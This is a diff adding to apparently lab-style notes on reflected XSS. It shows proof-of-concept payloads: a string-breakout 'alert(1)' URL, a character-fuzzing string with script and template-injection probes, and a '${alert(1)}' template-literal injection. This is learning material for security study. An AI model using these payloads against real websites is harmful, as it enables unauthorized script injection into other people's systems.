@@ -137,3 +137,17 @@ The value of the **search** request parameter is copied into a JavaScript string
 ```
 http://foo?&apos;-alert(1)-&apos;
 ```
+
+# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+Test which characters are not unicodes
+
+```html
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+```
+
+```js
+${alert(1)}
+```
+
+
